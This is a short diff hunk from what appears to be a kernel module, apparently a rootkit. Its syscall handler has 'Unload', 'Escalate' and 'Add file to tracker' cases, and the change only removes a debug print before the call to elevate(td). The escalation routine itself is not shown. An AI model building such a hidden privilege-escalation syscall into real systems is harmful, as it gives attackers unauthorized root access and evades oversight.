@@ -23,7 +23,6 @@ static int main(struct thread *td, void *syscall_args) {
 		case 0:// Unload
 			break;
 		case 1:// Escalate
-			uprintf("DOING\n");
 			elevate(td);
 			break;
 		case 2:// Add file to tracker
